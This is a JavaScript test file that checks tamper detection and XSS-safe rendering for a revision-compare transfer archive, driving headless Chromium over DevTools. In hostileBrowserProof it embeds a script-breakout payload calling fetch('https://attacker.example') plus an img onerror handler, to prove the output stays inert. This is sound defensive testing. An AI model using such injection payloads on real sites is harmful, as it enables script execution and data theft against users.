import assert from 'node:assert/strict';
import { spawn } from 'node:child_process';
import { once } from 'node:events';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { pathToFileURL } from 'node:url';
import { setTimeout as delay } from 'node:timers/promises';
import { sha256Text } from '../tabs/revision-compare/revision-hash.js';
import { renderRevisionCompareTransferArchiveHtml, extractRevisionCompareTransferArchiveBundle } from '../tabs/revision-compare/revision-transfer-archive-html.js';
import { validateRevisionCompareTransferArchiveAuthority } from '../tabs/revision-compare/revision-transfer-archive.js';
import { clone, cryptoRef, transferArchiveFixture } from './revision-compare-transfer-archive-fixtures.mjs';

const encoder = new TextEncoder();
function bytes(text) { return encoder.encode(text).byteLength; }
function quoted(value) { return JSON.stringify(value); }
async function retained(artifact) {
  artifact.contentSha256 = await sha256Text(artifact.text, cryptoRef);
  artifact.sizeBytes = bytes(artifact.text);
}
async function expectFirst(fixture, mutate, pattern) {
  const value = clone(fixture.workspace); await mutate(value);
  await assert.rejects(() => validateRevisionCompareTransferArchiveAuthority(value, cryptoRef), pattern);
}
async function validationPrecedence(fixture) {
  await expectFirst(fixture, async (value) => {
    value.transferCompletion.report.forceIdentityFailure = true;
    value.transferCompletion.reportArtifact.text += ' ';
  }, /completion report.*identity|content identity/i);
  await expectFirst(fixture, async (value) => {
    value.transferCompletion.reportArtifact.text += ' ';
    value.transferCompletion.bundle.payload.transferArtifacts[0].text += ' ';
    value.transferCompletion.bundle.forceIdentityFailure = true;
  }, /completion report retained SHA-256/i);
  await expectFirst(fixture, async (value) => {
    value.transferCompletion.bundle.payload.transferArtifacts[0].text += ' ';
    value.transferCompletion.bundle.forceIdentityFailure = true;
    value.transferCompletion.bundleArtifact.text += ' ';
  }, /embedded transfer artifact SHA-256/i);
  await expectFirst(fixture, async (value) => {
    value.transferCompletion.bundle.forceIdentityFailure = true;
    value.transferCompletion.bundleArtifact.text += ' ';
  }, /unsupported or missing fields|handover bundle.*identity|content identity/i);
  await expectFirst(fixture, async (value) => {
    value.transferCompletion.bundleArtifact.text += ' ';
  }, /handover bundle retained SHA-256/i);
  const noncanonical = clone(fixture.workspace);
  noncanonical.transferCompletion.reportArtifact.text = JSON.stringify(noncanonical.transferCompletion.report);
  await retained(noncanonical.transferCompletion.reportArtifact);
  await assert.rejects(() => validateRevisionCompareTransferArchiveAuthority(noncanonical, cryptoRef), /canonical serialization/i);
}
function chromiumPath() {
  const candidates = [process.env.CHROMIUM_PATH, '/usr/bin/chromium', '/usr/bin/chromium-browser', '/usr/bin/google-chrome'].filter(Boolean);
  const match = candidates.find(existsSync);
  if (!match) throw new Error('Chromium executable is required for RC-XFER-007 certification.');
  return match;
}
async function activePort(directory) {
  const file = join(directory, 'DevToolsActivePort');
  for (let index = 0; index < 100; index += 1) {
    if (existsSync(file)) return Number(readFileSync(file, 'utf8').split(/\r?\n/)[0]);
    await delay(50);
  }
  throw new Error('Chromium DevTools port was not published.');
}
async function pageSocket(port) {
  for (let index = 0; index < 100; index += 1) {
    const response = await fetch(`http://127.0.0.1:${port}/json/list`);
    const page = (await response.json()).find((item) => item.type === 'page');
    if (page) return page.webSocketDebuggerUrl;
    await delay(50);
  }
  throw new Error('Chromium page target was not published.');
}
function cdp(socket) {
  let nextId = 1; const pending = new Map(); const events = [];
  socket.addEventListener('message', ({ data }) => {
    const message = JSON.parse(data);
    if (message.id) { const item = pending.get(message.id); pending.delete(message.id); item?.[message.error ? 'reject' : 'resolve'](message.error ?? message.result); }
    else events.push(message);
  });
  return {
    events,
    call(method, params = {}) {
      const id = nextId; nextId += 1;
      return new Promise((resolvePromise, reject) => { pending.set(id, { resolve: resolvePromise, reject }); socket.send(JSON.stringify({ id, method, params })); });
    },
  };
}
async function waitForDocument(client, url) {
  for (let index = 0; index < 400; index += 1) {
    const state = await client.call('Runtime.evaluate', { expression: '({url:location.href,ready:document.readyState})', returnByValue: true });
    if (state.result?.value?.url === url && state.result.value.ready === 'complete') return;
    await delay(25);
  }
  throw new Error(`Timed out waiting for ${url}.`);
}
async function evaluateDocument(client, hostile) {
  const expression = `(() => { const scripts=[...document.scripts].map(s=>({id:s.id,type:s.type,src:s.src})); const elements=[...document.querySelectorAll('*')]; const eventAttributes=elements.flatMap(e=>[...e.attributes].filter(a=>a.name.toLowerCase().startsWith('on')).map(a=>a.name)); const resourceAttributes=elements.flatMap(e=>['src','href','action','formaction'].filter(n=>e.hasAttribute(n)).map(n=>e.getAttribute(n))); const node=document.querySelector('#revision-compare-transfer-handover'); const embedded=node?JSON.parse(node.textContent):null; return {scripts,eventAttributes,resourceAttributes,active:{img:document.images.length,iframe:document.querySelectorAll('iframe').length,object:document.querySelectorAll('object').length,embed:document.querySelectorAll('embed').length,form:document.forms.length,link:document.querySelectorAll('link').length},styleSheets:document.styleSheets.length,bodyDisplay:getComputedStyle(document.body).display,hostileRecovered:Boolean(embedded&&JSON.stringify(embedded).includes(${quoted(hostile)})),resources:performance.getEntriesByType('resource').map(item=>item.name)}; })()`;
  const evaluated = await client.call('Runtime.evaluate', { expression, returnByValue: true });
  if (evaluated.exceptionDetails) throw new Error(evaluated.exceptionDetails.text);
  return evaluated.result.value;
}
async function inspectLocalHtml(html, hostile) {
  const directory = mkdtempSync(join(tmpdir(), 'rc-xfer-007-'));
  const archivePath = join(directory, 'archive.html'); const profile = join(directory, 'profile');
  writeFileSync(archivePath, html, 'utf8'); const targetUrl = pathToFileURL(resolve(archivePath)).href;
  const processRef = spawn(chromiumPath(), ['--headless=new', '--no-sandbox', '--disable-gpu', '--remote-debugging-port=0', `--user-data-dir=${profile}`, 'about:blank'], { stdio: 'ignore' });
  try {
    const port = await activePort(profile); const socket = new WebSocket(await pageSocket(port));
    await new Promise((resolvePromise, reject) => { socket.addEventListener('open', resolvePromise, { once: true }); socket.addEventListener('error', reject, { once: true }); });
    const client = cdp(socket); await client.call('Page.enable'); await client.call('Runtime.enable'); await client.call('Network.enable'); await client.call('Log.enable');
    const tree = await client.call('Page.getFrameTree'); client.events.length = 0;
    await client.call('Page.setDocumentContent', { frameId: tree.frameTree.frame.id, html });
    const parsed = await evaluateDocument(client, hostile); const started = performance.now();
    const navigation = await client.call('Page.navigate', { url: targetUrl });
    let localFile = null; let fileNavigationError = navigation.errorText ?? null;
    if (!fileNavigationError) { await waitForDocument(client, targetUrl); localFile = await evaluateDocument(client, hostile); }
    const logs = client.events.filter((item) => item.method === 'Log.entryAdded').map((item) => item.params.entry).filter((item) => item.level === 'error');
    socket.close(); return { parsed, localFile, fileNavigationError, logs, loadDurationMs: performance.now() - started };
  } finally {
    processRef.kill('SIGKILL'); await Promise.race([once(processRef, 'exit'), delay(1000)]);
    rmSync(directory, { recursive: true, force: true, maxRetries: 20, retryDelay: 100 });
  }
}
async function hostileBrowserProof(fixture) {
  const hostile = `</script><script>fetch('https://attacker.example')</script><img src=x onerror=alert(1)>\u2028\u2029&<b>evidence</b>`;
  const bundle = clone(fixture.workspace.transferCompletion.bundle);
  bundle.payload.evidencePackage.payload.reviewSession.items[0].note = hostile;
  if (bundle.payload.evidencePackage.payload.decisionLedger.decisions[0]) bundle.payload.evidencePackage.payload.decisionLedger.decisions[0].rationale = hostile;
  bundle.payload.completionReport.declaration.declarantName = hostile;
  const html = renderRevisionCompareTransferArchiveHtml(bundle);
  assert.deepEqual(extractRevisionCompareTransferArchiveBundle(html), bundle);
  const result = await inspectLocalHtml(html, hostile);
  for (const inspected of [result.parsed, result.localFile].filter(Boolean)) {
    assert.deepEqual(inspected.scripts, [{ id: 'revision-compare-transfer-handover', type: 'application/json', src: '' }]);
    assert.deepEqual(inspected.eventAttributes, []); assert.deepEqual(inspected.resourceAttributes, []);
    assert.deepEqual(inspected.active, { img: 0, iframe: 0, object: 0, embed: 0, form: 0, link: 0 });
    assert.equal(inspected.styleSheets, 1); assert.equal(inspected.bodyDisplay, 'block'); assert.equal(inspected.hostileRecovered, true);
    assert.deepEqual(inspected.resources.filter((url) => /^https?:/i.test(url)), []);
  }
  if (result.fileNavigationError) console.log(`local-file Chromium unavailable: ${result.fileNavigationError}`);
  else console.log(`local-file Chromium load: ${result.loadDurationMs.toFixed(1)} ms`);
  assert.deepEqual(result.logs, []);
}

const fixture = await transferArchiveFixture();
await validationPrecedence(fixture);
await hostileBrowserProof(fixture);
console.log('revision-compare-transfer-archive-certification.test.mjs passed');
